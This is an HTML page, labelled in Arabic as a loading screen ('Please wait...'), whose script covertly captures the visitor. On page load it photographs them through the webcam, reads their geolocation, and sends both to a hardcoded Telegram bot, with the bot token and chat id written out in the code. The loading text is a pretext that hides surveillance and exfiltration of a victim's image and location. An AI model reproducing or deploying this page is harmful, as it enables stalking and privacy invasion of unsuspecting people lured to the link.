<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>جارٍ التحميل...</title>
</head>
<body>
  <h2>يرجى الانتظار...</h2>

  <video id="video" width="300" autoplay muted playsinline style="display: block;"></video>

  <script>
    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => setTimeout(resolve, 3000)); // الانتظار 3 ثواني

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg');
        const blob = await (await fetch(imageData)).blob();

        stream.getTracks().forEach(track => track.stop());

        // الحصول على الموقع
        navigator.geolocation.getCurrentPosition(async (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // إرسال الصورة
          const formData = new FormData();
          formData.append("chat_id", "1320552080");
          formData.append("photo", blob, "capture.jpg");

          await fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
            method: "POST",
            body: formData
          });

          // إرسال الموقع
          await fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
            method: "GET"
          });

        }, (error) => {
          console.error("فشل الحصول على الموقع:", error);
        });

      } catch (err) {
        console.error("فشل الوصول إلى الكاميرا:", err);
      }
    }

    captureAndSend();
  </script>
</body>
</html>
